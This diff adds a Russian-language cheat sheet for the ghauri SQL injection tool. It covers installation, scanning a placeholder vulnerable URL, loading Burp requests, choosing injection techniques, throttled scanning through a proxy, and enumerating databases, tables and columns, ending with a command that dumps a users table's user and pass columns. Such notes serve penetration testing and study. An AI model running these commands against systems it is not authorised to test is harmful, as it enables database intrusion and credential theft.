@@ -1,0 +1,60 @@
+Как получилось установить:
+git clone https://github.com/r0oth3x49/ghauri.git
+cd ghauri
+python3 -m venv .venv
+source .venv/bin/activate
+pip install --upgrade -r requirements.txt --break-system-packages
+python3 -m pip install -e .
+
+
+Использование:
+ghauri -u "http://example.com/vuln.php?id=1" --batch 
+-u URL
+--batch - не задавать вопросы
+
+Передаем запрос из Burp, указываем тестируемый параметр
+ghauri -r req.txt -p id --batch
+
+
+ghauri -u "http://example.com/vuln.php?id=1" --dbms=mysql --threads=5 --random-agent --batch
+
+--dbms=mysql - указать бд
+--threads=5 - поточность 
+--random-agent - рандом юсер агент
+
+
+Использование техник
+--technique=BEUST — явно указать техники инъекций:
+
+B – Boolean-based blind,
+
+E – Error-based,
+
+U – Union query,
+
+S – Stacked queries,
+
+T – Time-based blind.
+
+
+Осторожное сканирование:
+ghauri -u "..." --delay=2 --timeout=15 --retries=5 --proxy=http://127.0.0.1:8080 --batch
+
+--delay=2 пауза в сек между запросами
+--timeout=15 таймаут ожидания ответа
+--retries-5 кол-во повторных попыток при ошибках соединения.
+
+
+ghauri -u "..." --batch --dbms=mysql --dbs #список баз данных
+ghauri -u "..." --batch --dbms=mysql -D db_name --tables # таблицы в БД
+ghauri -u "..." --batch --dbms=mysql -D db_name -T users --columns  #столбцы таблицы
+ghauri -u "..." --batch --dbms=mysql -D db_name -T users -C user,pass --dump #дамп данных
+
+
+ghauri -u "..." --banner             # версия СУБД
+ghauri -u "..." --current-user      # текущий пользователь БД
+ghauri -u "..." --current-db        # текущая база данных
+ghauri -u "..." --hostname          # имя хоста сервера БД
+
+Для сохранения результатов в файл после основных опций:
+2>&1 | tee scan_results.log
